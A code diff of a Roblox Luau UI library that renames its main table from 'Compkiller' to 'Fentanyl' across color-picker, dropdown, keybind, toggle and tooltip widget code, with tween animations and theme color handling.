+			Fentanyl:_Animation(BlockText,TweenInfo.new(0.3),{
 				TextTransparency = rep.TextTransparency
 			});
 		end;
@@ -2126,33 +2126,33 @@
 
 		function rep:SetVisible(bool)
 			if bool then
-				Compkiller:_Animation(BlockText,rep.Tween,{
+				Fentanyl:_Animation(BlockText,rep.Tween,{
 					TextTransparency = rep.TextTransparency
 				});
 
-				Compkiller:_Animation(BlockLine,rep.Tween,{
+				Fentanyl:_Animation(BlockLine,rep.Tween,{
 					BackgroundTransparency = 0.500
 				});
 			else
-				Compkiller:_Animation(BlockText,rep.Tween,{
+				Fentanyl:_Animation(BlockText,rep.Tween,{
 					TextTransparency = 1
 				});
 
-				Compkiller:_Animation(BlockLine,rep.Tween,{
+				Fentanyl:_Animation(BlockLine,rep.Tween,{
 					BackgroundTransparency = 1
 				});
 			end;
 		end;
 
 		function rep:AddLink(Name , Default)
-			return Compkiller:_AddLinkValue(Name , Default , GlobalBlock , LinkValues , rep , Signal);
+			return Fentanyl:_AddLinkValue(Name , Default , GlobalBlock , LinkValues , rep , Signal);
 		end;
 
 		return rep;
 	end;
 
-	function Compkiller:_AddColorPickerPanel(Button: ImageButton , Callback: (Color: Color3) -> any?)
-		local Window = Compkiller:_GetWindowFromElement(Button);
+	function Fentanyl:_AddColorPickerPanel(Button: ImageButton , Callback: (Color: Color3) -> any?)
+		local Window = Fentanyl:_GetWindowFromElement(Button);
 		local BaseZ_Index = math.random(1,15) * 100;
 
 		local ColorPickerWindow = Instance.new("Frame")
@@ -2186,9 +2186,9 @@
 		local UIStroke_8 = Instance.new("UIStroke")
 		local TextLabel = Instance.new("TextLabel")
 
-		ColorPickerWindow.Name = Compkiller:_RandomString()
+		ColorPickerWindow.Name = Fentanyl:_RandomString()
 		ColorPickerWindow.Parent = Window
-		ColorPickerWindow.BackgroundColor3 = Compkiller.Colors.BlockBackground
+		ColorPickerWindow.BackgroundColor3 = Fentanyl.Colors.BlockBackground
 		ColorPickerWindow.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		ColorPickerWindow.BorderSizePixel = 0
 		ColorPickerWindow.Position = UDim2.new(123, 0, 123, 0)
@@ -2197,23 +2197,23 @@
 		ColorPickerWindow.AnchorPoint = Vector2.new(0.5,0)
 		ColorPickerWindow.Active = true;
 
-		table.insert(Compkiller.Elements.BlockBackground,{
+		table.insert(Fentanyl.Elements.BlockBackground,{
 			Element = ColorPickerWindow,
 			Property = "BackgroundColor3"
 		});
 
-		Compkiller:_AddDragBlacklist(ColorPickerWindow)
+		Fentanyl:_AddDragBlacklist(ColorPickerWindow)
 
-		UIStroke.Color = Compkiller.Colors.HighStrokeColor
+		UIStroke.Color = Fentanyl.Colors.HighStrokeColor
 		UIStroke.Parent = ColorPickerWindow
-		table.insert(Compkiller.Elements.HighStrokeColor , {
+		table.insert(Fentanyl.Elements.HighStrokeColor , {
 			Element = UIStroke,
 			Property = "Color"
 		})
 		UICorner.CornerRadius = UDim.new(0, 6)
 		UICorner.Parent = ColorPickerWindow
 
-		ColorPickBox.Name = Compkiller:_RandomString()
+		ColorPickBox.Name = Fentanyl:_RandomString()
 		ColorPickBox.Parent = ColorPickerWindow
 		ColorPickBox.BackgroundColor3 = Color3.fromRGB(39, 255, 35)
 		ColorPickBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -2223,7 +2223,7 @@
 		ColorPickBox.ZIndex = BaseZ_Index + 1
 		ColorPickBox.Image = "http://www.roblox.com/asset/?id=112554223509763"
 
-		MouseMovement.Name = Compkiller:_RandomString()
+		MouseMovement.Name = Fentanyl:_RandomString()
 		MouseMovement.Parent = ColorPickBox
 		MouseMovement.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		MouseMovement.BackgroundTransparency = 1.000
@@ -2241,7 +2241,7 @@
 		UIStroke_2.Color = Color3.fromRGB(29, 29, 29)
 		UIStroke_2.Parent = ColorPickBox
 
-		ColorRedGreenBlue.Name = Compkiller:_RandomString()
+		ColorRedGreenBlue.Name = Fentanyl:_RandomString()
 		ColorRedGreenBlue.Parent = ColorPickerWindow
 		ColorRedGreenBlue.AnchorPoint = Vector2.new(1, 0)
 		ColorRedGreenBlue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -2259,7 +2259,7 @@
 		UICorner_3.CornerRadius = UDim.new(1, 0)
 		UICorner_3.Parent = ColorRedGreenBlue
 
-		ColorRGBSlide.Name = Compkiller:_RandomString()
+		ColorRGBSlide.Name = Fentanyl:_RandomString()
 		ColorRGBSlide.Parent = ColorRedGreenBlue
 		ColorRGBSlide.AnchorPoint = Vector2.new(0.5, 0)
 		ColorRGBSlide.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -2270,7 +2270,7 @@
 		ColorRGBSlide.Size = UDim2.new(1, 0, 0, 2)
 		ColorRGBSlide.ZIndex = BaseZ_Index + 7
 
-		Left.Name = Compkiller:_RandomString()
+		Left.Name = Fentanyl:_RandomString()
 		Left.Parent = ColorRGBSlide
 		Left.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		Left.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -2280,7 +2280,7 @@
 
 		UIStroke_3.Parent = Left
 
-		Right.Name = Compkiller:_RandomString()
+		Right.Name = Fentanyl:_RandomString()
 		Right.Parent = ColorRGBSlide
 		Right.AnchorPoint = Vector2.new(1, 0)
 		Right.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -2292,7 +2292,7 @@
 
 		UIStroke_4.Parent = Right
 
-		ColorOpc.Name = Compkiller:_RandomString()
+		ColorOpc.Name = Fentanyl:_RandomString()
 		ColorOpc.Parent = ColorPickerWindow
 		ColorOpc.BackgroundColor3 = Color3.fromRGB(102, 255, 0)
 		ColorOpc.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -2304,7 +2304,7 @@
 		UICorner_4.CornerRadius = UDim.new(1, 0)
 		UICorner_4.Parent = ColorOpc
 
-		ColorOptSlide.Name = Compkiller:_RandomString()
+		ColorOptSlide.Name = Fentanyl:_RandomString()
 		ColorOptSlide.Parent = ColorOpc
 		ColorOptSlide.AnchorPoint = Vector2.new(0, 0.5)
 		ColorOptSlide.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -2315,7 +2315,7 @@
 		ColorOptSlide.Size = UDim2.new(0, 2, 1, 0)
 		ColorOptSlide.ZIndex = BaseZ_Index + 7
 
-		Left_2.Name = Compkiller:_RandomString()
+		Left_2.Name = Fentanyl:_RandomString()
 		Left_2.Parent = ColorOptSlide
 		Left_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 		Left_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -2325,7 +2325,7 @@
 
 		UIStroke_5.Parent = Left_2
 
-		Right_2.Name = Compkiller:_RandomString()
+		Right_2.Name = Fentanyl:_RandomString()
 		Right_2.Parent = ColorOptSlide
 		Right_2.AnchorPoint = Vector2.new(0, 1)
 		Right_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -2358,17 +2358,17 @@
 		UICorner_5.CornerRadius = UDim.new(1, 0)
 		UICorner_5.Parent = TransparentImage
 
-		HexFrame.Name = Compkiller:_RandomString()
+		HexFrame.Name = Fentanyl:_RandomString()
 		HexFrame.Parent = ColorPickerWindow
 		HexFrame.AnchorPoint = Vector2.new(0.5, 1)
-		HexFrame.BackgroundColor3 = Compkiller.Colors.BlockColor
+		HexFrame.BackgroundColor3 = Fentanyl.Colors.BlockColor
 		HexFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		HexFrame.BorderSizePixel = 0
 		HexFrame.Position = UDim2.new(0.5, 0, 1, -5)
 		HexFrame.Size = UDim2.new(1, -16, 0, 20)
 		HexFrame.ZIndex = BaseZ_Index + 205
 
-		table.insert(Compkiller.Elements.BlockColor,{
+		table.insert(Fentanyl.Elements.BlockColor,{
 			Element = HexFrame,
 			Property = "BackgroundColor3"
 		});
@@ -2376,10 +2376,10 @@
 		UICorner_6.CornerRadius = UDim.new(0, 4)
 		UICorner_6.Parent = HexFrame
 
-		UIStroke_8.Color = Compkiller.Colors.HighStrokeColor
+		UIStroke_8.Color = Fentanyl.Colors.HighStrokeColor
 		UIStroke_8.Parent = HexFrame
 
-		table.insert(Compkiller.Elements.HighStrokeColor,{
+		table.insert(Fentanyl.Elements.HighStrokeColor,{
 			Element = UIStroke_8,
 			Property = "Color"
 		});
@@ -2394,11 +2394,11 @@
 		TextLabel.ZIndex = BaseZ_Index + 206
 		TextLabel.Font = Enum.Font.Gotham
 		TextLabel.Text = "#FFFFFFF"
-		TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+		TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 		TextLabel.TextSize = 13.000
 		TextLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-		table.insert(Compkiller.Elements.SwitchColor , {
+		table.insert(Fentanyl.Elements.SwitchColor , {
 			Element = TextLabel,
 			Property = 'TextColor3'
 		});
@@ -2411,7 +2411,7 @@
 		local Tween = TweenInfo.new(0.2 , Enum.EasingStyle.Quad);
 		local Tween2 = TweenInfo.new(0.275 , Enum.EasingStyle.Quad);
 
-		Compkiller:_AddPropertyEvent(ColorPickerWindow,function(v)
+		Fentanyl:_AddPropertyEvent(ColorPickerWindow,function(v)
 			ColorPickerWindow.Visible = v;
 		end)
 
@@ -2440,174 +2440,174 @@
 					ColorPickerWindow.Position = DropPosition
 				end;
 
-				Compkiller:_Animation(ColorPickerWindow,Tween2,{
+				Fentanyl:_Animation(ColorPickerWindow,Tween2,{
 					BackgroundTransparency = 0,
 					Size = UDim2.new(0, 175, 0, 200)
 				});
 
-				Compkiller:_Animation(ColorPickerWindow,Tween,{
+				Fentanyl:_Animation(ColorPickerWindow,Tween,{
 					Position = MainPosition,
 				});
 
-				Compkiller:_Animation(UIStroke_8,Tween,{
+				Fentanyl:_Animation(UIStroke_8,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(UIStroke_7,Tween,{
+				Fentanyl:_Animation(UIStroke_7,Tween,{
 					Transparency = 0.5
 				});
 
-				Compkiller:_Animation(UIStroke_6,Tween,{
+				Fentanyl:_Animation(UIStroke_6,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(UIStroke_5,Tween,{
+				Fentanyl:_Animation(UIStroke_5,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(UIStroke_4,Tween,{
+				Fentanyl:_Animation(UIStroke_4,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(UIStroke_3,Tween,{
+				Fentanyl:_Animation(UIStroke_3,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(UIStroke_2,Tween,{
+				Fentanyl:_Animation(UIStroke_2,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(UIStroke,Tween,{
+				Fentanyl:_Animation(UIStroke,Tween,{
 					Transparency = 0
 				});
 
-				Compkiller:_Animation(ColorPickBox,Tween,{
+				Fentanyl:_Animation(ColorPickBox,Tween,{
 					BackgroundTransparency = 0,
 					ImageTransparency = 0
 				});
 
-				Compkiller:_Animation(MouseMovement,Tween,{
+				Fentanyl:_Animation(MouseMovement,Tween,{
 					ImageTransparency = 0
 				});
 
-				Compkiller:_Animation(ColorOpc,Tween,{
+				Fentanyl:_Animation(ColorOpc,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(TransparentImage,Tween,{
+				Fentanyl:_Animation(TransparentImage,Tween,{
 					ImageTransparency = 0
 				});
 
-				Compkiller:_Animation(Left,Tween,{
+				Fentanyl:_Animation(Left,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(Left_2,Tween,{
+				Fentanyl:_Animation(Left_2,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(Right,Tween,{
+				Fentanyl:_Animation(Right,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(Right_2,Tween,{
+				Fentanyl:_Animation(Right_2,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(ColorRedGreenBlue,Tween,{
+				Fentanyl:_Animation(ColorRedGreenBlue,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(HexFrame,Tween,{
+				Fentanyl:_Animation(HexFrame,Tween,{
 					BackgroundTransparency = 0
 				});
 
-				Compkiller:_Animation(TextLabel,Tween,{
+				Fentanyl:_Animation(TextLabel,Tween,{
 					TextTransparency = 0
 				});
 			else
-				Compkiller:_Animation(UIStroke_8,Tween,{
+				Fentanyl:_Animation(UIStroke_8,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke_7,Tween,{
+				Fentanyl:_Animation(UIStroke_7,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke_6,Tween,{
+				Fentanyl:_Animation(UIStroke_6,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke_5,Tween,{
+				Fentanyl:_Animation(UIStroke_5,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke_4,Tween,{
+				Fentanyl:_Animation(UIStroke_4,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke_3,Tween,{
+				Fentanyl:_Animation(UIStroke_3,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke_2,Tween,{
+				Fentanyl:_Animation(UIStroke_2,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(UIStroke,Tween,{
+				Fentanyl:_Animation(UIStroke,Tween,{
 					Transparency = 1
 				});
 
-				Compkiller:_Animation(ColorPickerWindow,Tween2,{
+				Fentanyl:_Animation(ColorPickerWindow,Tween2,{
 					BackgroundTransparency = 1,
 				});
 
-				Compkiller:_Animation(ColorPickerWindow,Tween,{
+				Fentanyl:_Animation(ColorPickerWindow,Tween,{
 					Position = DropPosition,
 				});
 
-				Compkiller:_Animation(ColorPickBox,Tween,{
+				Fentanyl:_Animation(ColorPickBox,Tween,{
 					BackgroundTransparency = 1,
 					ImageTransparency = 1
 				});
 
-				Compkiller:_Animation(MouseMovement,Tween,{
+				Fentanyl:_Animation(MouseMovement,Tween,{
 					ImageTransparency = 1
 				});
 
-				Compkiller:_Animation(ColorOpc,Tween,{
+				Fentanyl:_Animation(ColorOpc,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(TransparentImage,Tween,{
+				Fentanyl:_Animation(TransparentImage,Tween,{
 					ImageTransparency = 1
 				});
 
-				Compkiller:_Animation(Left,Tween,{
+				Fentanyl:_Animation(Left,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(Left_2,Tween,{
+				Fentanyl:_Animation(Left_2,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(Right,Tween,{
+				Fentanyl:_Animation(Right,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(Right_2,Tween,{
+				Fentanyl:_Animation(Right_2,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(ColorRedGreenBlue,Tween,{
+				Fentanyl:_Animation(ColorRedGreenBlue,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(HexFrame,Tween,{
+				Fentanyl:_Animation(HexFrame,Tween,{
 					BackgroundTransparency = 1
 				});
 
-				Compkiller:_Animation(TextLabel,Tween,{
+				Fentanyl:_Animation(TextLabel,Tween,{
 					TextTransparency = 1
 				});
 			end;
@@ -2629,23 +2629,23 @@
 			local MainColor = Color3.fromHSV(H , S , 1);
 			local RealColor = Color3.fromHSV(H , S , V);
 
-			Compkiller:_Animation(ColorPickBox,TweenInfo.new(0.2),{
+			Fentanyl:_Animation(ColorPickBox,TweenInfo.new(0.2),{
 				BackgroundColor3 = Color3.fromHSV(H , 1 , 1)
 			});
 
-			Compkiller:_Animation(ColorOpc,TweenInfo.new(0.2),{
+			Fentanyl:_Animation(ColorOpc,TweenInfo.new(0.2),{
 				BackgroundColor3 = RealColor
 			});
 
-			Compkiller:_Animation(MouseMovement,TweenInfo.new(0.2),{
+			Fentanyl:_Animation(MouseMovement,TweenInfo.new(0.2),{
 				Position = UDim2.fromScale(S , 1 - V)
 			});
 
-			Compkiller:_Animation(ColorOptSlide,TweenInfo.new(0.2),{
+			Fentanyl:_Animation(ColorOptSlide,TweenInfo.new(0.2),{
 				Position = UDim2.new(Transparency ,0 , 0.5 ,0)
 			});
 
-			Compkiller:_Animation(ColorRGBSlide,TweenInfo.new(0.2),{
+			Fentanyl:_Animation(ColorRGBSlide,TweenInfo.new(0.2),{
 				Position = UDim2.new(0.5 ,0 , H ,0)
 			});
 
@@ -2690,7 +2690,7 @@
 
 		UserInputService.InputBegan:Connect(function(Input)
 			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
-				if not Compkiller:_IsMouseOverFrame(ColorPickerWindow) then
+				if not Fentanyl:_IsMouseOverFrame(ColorPickerWindow) then
 					ToggleUI(false);
 				end;
 			end;
@@ -2755,19 +2755,19 @@
 		return Args;
 	end;
 
-	function Compkiller:_AddPropertyEvent(Target: Frame , Callback: (boolean) -> any)
+	function Fentanyl:_AddPropertyEvent(Target: Frame , Callback: (boolean) -> any)
 		Target:GetPropertyChangedSignal('BackgroundTransparency'):Connect(function()
 			Callback(Target.BackgroundTransparency <= 0.9)
 		end)
 	end;
 
-	function Compkiller:_LoadOption(Value , TabSignal)
+	function Fentanyl:_LoadOption(Value , TabSignal)
 		local Args = {};
-		local Window = Compkiller:_GetWindowFromElement(Value.Root);
+		local Window = Fentanyl:_GetWindowFromElement(Value.Root);
 		local Tween = TweenInfo.new(0.3,Enum.EasingStyle.Quint);
 
 		function Args:AddKeybind(Config: MiniKeybind)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Name = "Keybind",
 				Default = nil,
 				Flag = nil,
@@ -2783,7 +2783,7 @@
 				return Config.Blacklist and (Config.Blacklist[v] or table.find(Config.Blacklist,v))
 			end;
 
-			Compkiller:_Input(Keybind.Root,function()
+			Fentanyl:_Input(Keybind.Root,function()
 				if IsBinding then
 					return;
 				end;
@@ -2834,14 +2834,14 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddHelper(Config: Helper)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Text = "Information."
 			});
 
@@ -2867,7 +2867,7 @@
 
 				local scale = TextService:GetTextSize(Helper.Text.Text,Helper.Text.TextSize,Helper.Text.Font,Vector2.new(math.huge,math.huge));
 
-				Compkiller:_Animation(Helper.Text , TweenInfo.new(0.15), {
+				Fentanyl:_Animation(Helper.Text , TweenInfo.new(0.15), {
 					Size = UDim2.fromOffset(scale.X + 50, scale.Y + 5)
 				})
 
@@ -2877,13 +2877,13 @@
 			local Release = function()
 				local scale = Update()
 
-				Compkiller:_Animation(Helper.Text,TweenInfo.new(0.15),{
+				Fentanyl:_Animation(Helper.Text,TweenInfo.new(0.15),{
 					TextTransparency = 1,
 					BackgroundTransparency = 1,
 					Position = UDim2.fromOffset(Button.AbsolutePosition.X,Button.AbsolutePosition.Y + (45))
 				});
 
-				Compkiller:_Animation(Helper.UIStroke,TweenInfo.new(0.15),{
+				Fentanyl:_Animation(Helper.UIStroke,TweenInfo.new(0.15),{
 					Transparency = 1
 				});
 			end;
@@ -2895,19 +2895,19 @@
 					Helper.Text.Position = UDim2.fromOffset(Button.AbsolutePosition.X,Button.AbsolutePosition.Y + (45))
 				end;
 
-				Compkiller:_Animation(Helper.Text,TweenInfo.new(0.15),{
+				Fentanyl:_Animation(Helper.Text,TweenInfo.new(0.15),{
 					TextTransparency = 0.35,
 					BackgroundTransparency = 0,
 					Position = UDim2.fromOffset(Button.AbsolutePosition.X,Button.AbsolutePosition.Y + (40 - (scale.Y / 2)))
 				});
 
-				Compkiller:_Animation(Helper.UIStroke,TweenInfo.new(0.15),{
+				Fentanyl:_Animation(Helper.UIStroke,TweenInfo.new(0.15),{
 					Transparency = 0
 				});
 
 			end;
 
-			Compkiller:_Hover(Button,  Hold, Release);
+			Fentanyl:_Hover(Button,  Hold, Release);
 
 			Release();
 
@@ -2921,7 +2921,7 @@
 		end;
 
 		function Args:AddColorPicker(Config: MiniColorPicker)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Default = Color3.fromRGB(255,255,255),
 				Transparency = 0,
 				Callback = function() end
@@ -2929,9 +2929,9 @@
 
 			local ColorPicker:Frame , ColorFrame: Frame = Value:AddLink('ColorPicker' , Config.Default);
 
-			local Button = Compkiller:_Input(ColorPicker);
+			local Button = Fentanyl:_Input(ColorPicker);
 
-			local ColorPicker = Compkiller:_AddColorPickerPanel(Button,function(color,opc)
+			local ColorPicker = Fentanyl:_AddColorPickerPanel(Button,function(color,opc)
 				Config.Default = color;
 				Config.Transparency = opc;
 
@@ -2969,14 +2969,14 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddToggle(Config : MiniToggle)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Flag = nil,
 				Default = false,
 				Callback = function() end;
@@ -3009,7 +3009,7 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
@@ -3019,7 +3019,7 @@
 			local Element: ImageButton = Value:AddLink("Option");
 			local BaseZ_Index = math.random(1,15) * 100;
 
-			local Signal = Compkiller.__SIGNAL(false);
+			local Signal = Fentanyl.__SIGNAL(false);
 
 			local ExtractElement = Instance.new("Frame")
 			local UIStroke = Instance.new("UIStroke")
@@ -3052,40 +3052,40 @@
 						ExtractElement.Position = DropPosition
 					end;
 
-					Compkiller:_Animation(ExtractElement , Tween , {
+					Fentanyl:_Animation(ExtractElement , Tween , {
 						Position = MainPosition,
 						BackgroundTransparency = 0,
 						Size = UDim2.new(0, 225, 0, UIListLayout.AbsoluteContentSize.Y)
 					});
 
-					Compkiller:_Animation(UIStroke , Tween , {
+					Fentanyl:_Animation(UIStroke , Tween , {
 						Transparency = 0
 					});
 
 				else
 					Signal:Fire(false);
 
-					Compkiller:_Animation(ExtractElement , Tween , {
+					Fentanyl:_Animation(ExtractElement , Tween , {
 						Position = DropPosition,
 						BackgroundTransparency = 1,
 						Size = UDim2.new(0, 225, 0, UIListLayout.AbsoluteContentSize.Y - 10)
 					});
 
-					Compkiller:_Animation(UIStroke , Tween , {
+					Fentanyl:_Animation(UIStroke , Tween , {
 						Transparency = 1
 					});
 				end;
 			end;
 
-			Compkiller:_AddPropertyEvent(ExtractElement,function(bool)
+			Fentanyl:_AddPropertyEvent(ExtractElement,function(bool)
 				ExtractElement.Visible = bool;
 			end);
 
-			Compkiller:_AddDragBlacklist(ExtractElement);
+			Fentanyl:_AddDragBlacklist(ExtractElement);
 
-			ExtractElement.Name = Compkiller:_RandomString()
+			ExtractElement.Name = Fentanyl:_RandomString()
 			ExtractElement.Parent = Window
-			ExtractElement.BackgroundColor3 = Compkiller.Colors.BlockBackground
+			ExtractElement.BackgroundColor3 = Fentanyl.Colors.BlockBackground
 			ExtractElement.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			ExtractElement.BorderSizePixel = 0
 			ExtractElement.ClipsDescendants = true
@@ -3095,15 +3095,15 @@
 			ExtractElement.Visible = false
 			ExtractElement.ClipsDescendants = true
 
-			table.insert(Compkiller.Elements.BlockBackground,{
+			table.insert(Fentanyl.Elements.BlockBackground,{
 				Element = ExtractElement,
 				Property = "BackgroundColor3"
 			});
 
-			UIStroke.Color = Compkiller.Colors.HighStrokeColor
+			UIStroke.Color = Fentanyl.Colors.HighStrokeColor
 			UIStroke.Parent = ExtractElement
 
-			table.insert(Compkiller.Elements.HighStrokeColor,{
+			table.insert(Fentanyl.Elements.HighStrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			});
@@ -3111,7 +3111,7 @@
 			UICorner.CornerRadius = UDim.new(0, 6)
 			UICorner.Parent = ExtractElement
 
-			Elements.Name = Compkiller:_RandomString()
+			Elements.Name = Fentanyl:_RandomString()
 			Elements.Parent = ExtractElement
 			Elements.AnchorPoint = Vector2.new(0.5, 0.5)
 			Elements.BackgroundTransparency = 1.000
@@ -3134,20 +3134,20 @@
 
 			UserInputService.InputBegan:Connect(function(Input)
 				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
-					if Toggl and not Compkiller:_IsMouseOverFrame(ExtractElement) and not Compkiller:_IsMouseOverFrame(Element) then
+					if Toggl and not Fentanyl:_IsMouseOverFrame(ExtractElement) and not Fentanyl:_IsMouseOverFrame(Element) then
 						ToggleUI(false);
 					end;
 				end
 			end)		
 
-			return Compkiller:_LoadElement(Elements , true , Signal)
+			return Fentanyl:_LoadElement(Elements , true , Signal)
 		end;
 
 		return Args;
 	end;
 
-	function Compkiller:_LoadDropdown(BaseParent: TextButton , Callback: () -> any)
-		local Window = Compkiller:_GetWindowFromElement(BaseParent);
+	function Fentanyl:_LoadDropdown(BaseParent: TextButton , Callback: () -> any)
+		local Window = Fentanyl:_GetWindowFromElement(BaseParent);
 		local BaseZ_Index = BaseParent.ZIndex + (math.random(1,15) * 100);
 
 		local DropdownWindow = Instance.new("Frame")
@@ -3155,32 +3155,32 @@
 		local UICorner = Instance.new("UICorner")
 		local ScrollingFrame = Instance.new("ScrollingFrame")
 		local UIListLayout = Instance.new("UIListLayout")
-		local ToggleDb = Compkiller.__SIGNAL(false);
-		local EventOut = Compkiller.__SIGNAL(0);
+		local ToggleDb = Fentanyl.__SIGNAL(false);
+		local EventOut = Fentanyl.__SIGNAL(0);
 
-		DropdownWindow.Name = Compkiller:_RandomString()
+		DropdownWindow.Name = Fentanyl:_RandomString()
 		DropdownWindow.Parent = Window
-		DropdownWindow.BackgroundColor3 = Compkiller.Colors.BlockBackground
+		DropdownWindow.BackgroundColor3 = Fentanyl.Colors.BlockBackground
 		DropdownWindow.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		DropdownWindow.BorderSizePixel = 0
 		DropdownWindow.Position = UDim2.new(123, 0, 123, 0)
 		DropdownWindow.Size = UDim2.new(0, 190, 0, 200)
 		DropdownWindow.ZIndex = BaseZ_Index
 
-		table.insert(Compkiller.Elements.BlockBackground,{
+		table.insert(Fentanyl.Elements.BlockBackground,{
 			Element = DropdownWindow,
 			Property = "BackgroundColor3"
 		});
 
-		Compkiller:_AddDragBlacklist(DropdownWindow);
-		Compkiller:_AddPropertyEvent(DropdownWindow,function(v)
+		Fentanyl:_AddDragBlacklist(DropdownWindow);
+		Fentanyl:_AddPropertyEvent(DropdownWindow,function(v)
 			DropdownWindow.Visible = v;
 		end)
 
-		UIStroke.Color = Compkiller.Colors.HighStrokeColor
+		UIStroke.Color = Fentanyl.Colors.HighStrokeColor
 		UIStroke.Parent = DropdownWindow
 
-		table.insert(Compkiller.Elements.HighStrokeColor , {
+		table.insert(Fentanyl.Elements.HighStrokeColor , {
 			Element = UIStroke,
 			Property = "Color"
 		})
@@ -3235,23 +3235,23 @@
 					DropdownWindow.Position = DropPosition;
 				end;
 
-				Compkiller:_Animation(DropdownWindow,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(DropdownWindow,TweenInfo.new(0.2),{
 					BackgroundTransparency = 0,
 					Position = MainPosition,
 					Size = UDim2.new(0, BaseParent.AbsoluteSize.X - 1, 0, math.clamp(UIListLayout.AbsoluteContentSize.Y + 10,10 , 200))
 				})
 
-				Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 					Transparency = 0
 				})
 			else
-				Compkiller:_Animation(DropdownWindow,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(DropdownWindow,TweenInfo.new(0.2),{
 					BackgroundTransparency = 1,
 					Position = DropPosition,
 					Size = UDim2.new(0, BaseParent.AbsoluteSize.X - 1, 0, math.clamp(UIListLayout.AbsoluteContentSize.Y / 1.5, 10 , 200))
 				})
 
-				Compkiller:_Animation(UIStroke,TweenInfo.new(0.2),{
+				Fentanyl:_Animation(UIStroke,TweenInfo.new(0.2),{
 					Transparency = 1
 				})
 			end;
@@ -3270,14 +3270,14 @@
 			local BlockText = Instance.new("TextLabel")
 			local BlockLine = Instance.new("Frame")
 
-			DropdownItem.Name = Compkiller:_RandomString()
+			DropdownItem.Name = Fentanyl:_RandomString()
 			DropdownItem.BackgroundTransparency = 1.000
 			DropdownItem.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			DropdownItem.BorderSizePixel = 0
 			DropdownItem.Size = UDim2.new(1, -1, 0, 20)
 			DropdownItem.ZIndex = BaseZ_Index + 6
 
-			BlockText.Name = Compkiller:_RandomString()
+			BlockText.Name = Fentanyl:_RandomString()
 			BlockText.Parent = DropdownItem
 			BlockText.AnchorPoint = Vector2.new(0, 0.5)
 			BlockText.BackgroundTransparency = 1.000
@@ -3288,20 +3288,20 @@
 			BlockText.ZIndex = BaseZ_Index + 6
 			BlockText.Font = Enum.Font.GothamMedium
 			BlockText.Text = ""
-			BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+			BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
